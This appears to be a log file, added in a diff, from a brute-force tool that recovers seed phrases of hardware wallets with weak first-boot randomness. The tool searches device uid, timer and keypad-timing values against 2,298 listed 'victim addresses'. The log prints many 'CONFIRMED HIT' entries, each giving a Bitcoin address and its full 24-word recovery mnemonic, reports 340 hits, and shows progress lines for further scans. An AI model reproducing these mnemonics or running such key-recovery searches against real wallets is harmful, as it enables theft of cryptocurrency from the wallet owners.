+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460059
+  systick  = 53072
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460060
+  systick  = 53097
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460061
+  systick  = 53096
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460062
+  systick  = 53099
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460063
+  systick  = 53098
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460064
+  systick  = 53101
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460065
+  systick  = 53100
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460066
+  systick  = 53103
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460067
+  systick  = 53102
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460068
+  systick  = 53089
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460069
+  systick  = 53088
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460070
+  systick  = 53113
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460071
+  systick  = 53112
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460072
+  systick  = 53115
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+[78.47%] 518.32M/660.56M @ 44.19K/s  ETA 0.89h
+[81.00%] 535.04M/660.56M @ 44.18K/s  ETA 0.79h
+[83.53%] 551.76M/660.56M @ 44.18K/s  ETA 0.68h
+[86.06%] 568.48M/660.56M @ 44.17K/s  ETA 0.58h
+[88.59%] 585.20M/660.56M @ 44.17K/s  ETA 0.47h
+[91.12%] 601.92M/660.56M @ 44.16K/s  ETA 0.37h
+[93.65%] 618.64M/660.56M @ 44.16K/s  ETA 0.26h
+[96.19%] 635.36M/660.56M @ 44.15K/s  ETA 0.16h
+[98.72%] 652.08M/660.56M @ 44.14K/s  ETA 0.05h
+[100.00%] 660.56M/660.56M @ 44.14K/s  ETA 0.00h
+
+done: 660.56M candidates, 340 confirmed hit(s)
+[2026-08-06 11:35:34] END   B=24 x[0..72] y[0..72]  confirmed_total=340
+[2026-08-06 11:35:34] START B=26 x[0..72] y[0..72]
+uid candidates: 8257
+targets: 2298 victim addresses (purpose 84 kind 0 coin 0)
+profile           = retail-first-boot
+rtc range         = 0..0 (raw RTC_TR)
+systick range     = 0..79999
+ssr range         = 0..0
+kpad-a range      = 2..2 (pre-terms scans)
+kpad-b range      = 26..26 step 1 (post-terms scans)
+total candidates  = 660.56M
+chunk             = up to 16.72M candidates (209 uid x 1 rtc)
+[2.53%] 16.72M/660.56M @ 43.94K/s  ETA 4.07h
+[5.06%] 33.44M/660.56M @ 44.10K/s  ETA 3.95h
+[7.59%] 50.16M/660.56M @ 44.10K/s  ETA 3.84h
+[10.12%] 66.88M/660.56M @ 44.17K/s  ETA 3.73h
+[12.66%] 83.60M/660.56M @ 44.08K/s  ETA 3.64h
+[15.19%] 100.32M/660.56M @ 44.09K/s  ETA 3.53h
+[17.72%] 117.04M/660.56M @ 44.12K/s  ETA 3.42h
+[20.25%] 133.76M/660.56M @ 44.12K/s  ETA 3.32h
+[22.78%] 150.48M/660.56M @ 44.14K/s  ETA 3.21h
+[25.31%] 167.20M/660.56M @ 44.11K/s  ETA 3.11h
+[27.84%] 183.92M/660.56M @ 44.12K/s  ETA 3.00h
+[30.37%] 200.64M/660.56M @ 44.14K/s  ETA 2.89h
+[32.91%] 217.36M/660.56M @ 44.15K/s  ETA 2.79h
+[35.44%] 234.08M/660.56M @ 44.16K/s  ETA 2.68h
+[37.97%] 250.80M/660.56M @ 44.17K/s  ETA 2.58h
+[40.50%] 267.52M/660.56M @ 44.17K/s  ETA 2.47h
+[43.03%] 284.24M/660.56M @ 44.11K/s  ETA 2.37h
+[45.56%] 300.96M/660.56M @ 44.06K/s  ETA 2.27h
+[48.09%] 317.68M/660.56M @ 44.03K/s  ETA 2.16h
+[50.62%] 334.40M/660.56M @ 44.00K/s  ETA 2.06h
+[53.15%] 351.12M/660.56M @ 43.98K/s  ETA 1.95h
+[55.69%] 367.84M/660.56M @ 43.98K/s  ETA 1.85h
+[58.22%] 384.56M/660.56M @ 43.99K/s  ETA 1.74h
+[60.75%] 401.28M/660.56M @ 44.01K/s  ETA 1.64h
+[63.28%] 418.00M/660.56M @ 43.97K/s  ETA 1.53h
+[65.81%] 434.72M/660.56M @ 43.92K/s  ETA 1.43h
+[68.34%] 451.44M/660.56M @ 43.92K/s  ETA 1.32h
+[70.87%] 468.16M/660.56M @ 43.92K/s  ETA 1.22h
+[73.40%] 484.88M/660.56M @ 43.91K/s  ETA 1.11h
+[75.94%] 501.60M/660.56M @ 43.89K/s  ETA 1.01h
+[78.47%] 518.32M/660.56M @ 43.88K/s  ETA 0.90h
+[81.00%] 535.04M/660.56M @ 43.87K/s  ETA 0.79h
+[83.53%] 551.76M/660.56M @ 43.87K/s  ETA 0.69h
+[86.06%] 568.48M/660.56M @ 43.87K/s  ETA 0.58h
+[88.59%] 585.20M/660.56M @ 43.87K/s  ETA 0.48h
+[91.12%] 601.92M/660.56M @ 43.87K/s  ETA 0.37h
+[93.65%] 618.64M/660.56M @ 43.87K/s  ETA 0.27h
+[96.19%] 635.36M/660.56M @ 43.87K/s  ETA 0.16h
+[98.72%] 652.08M/660.56M @ 43.86K/s  ETA 0.05h
+[100.00%] 660.56M/660.56M @ 43.86K/s  ETA 0.00h
+
+done: 660.56M candidates, 0 confirmed hit(s)
+[2026-08-06 15:46:34] END   B=26 x[0..72] y[0..72]  confirmed_total=340
+[2026-08-06 15:46:34] START B=28 x[0..72] y[0..72]
+uid candidates: 8257
+targets: 2298 victim addresses (purpose 84 kind 0 coin 0)
+profile           = retail-first-boot
+rtc range         = 0..0 (raw RTC_TR)
+systick range     = 0..79999
+ssr range         = 0..0
+kpad-a range      = 2..2 (pre-terms scans)
+kpad-b range      = 28..28 step 1 (post-terms scans)
+total candidates  = 660.56M
+chunk             = up to 16.72M candidates (209 uid x 1 rtc)
+[2.53%] 16.72M/660.56M @ 43.73K/s  ETA 4.09h
+[5.06%] 33.44M/660.56M @ 43.67K/s  ETA 3.99h
+[7.59%] 50.16M/660.56M @ 43.58K/s  ETA 3.89h
+[10.12%] 66.88M/660.56M @ 43.61K/s  ETA 3.78h
+[12.66%] 83.60M/660.56M @ 43.68K/s  ETA 3.67h
+[15.19%] 100.32M/660.56M @ 43.65K/s  ETA 3.56h
+[17.72%] 117.04M/660.56M @ 43.71K/s  ETA 3.45h
+[20.25%] 133.76M/660.56M @ 43.74K/s  ETA 3.35h
+[22.78%] 150.48M/660.56M @ 43.79K/s  ETA 3.24h
+[25.31%] 167.20M/660.56M @ 43.76K/s  ETA 3.13h
+[27.84%] 183.92M/660.56M @ 43.75K/s  ETA 3.03h
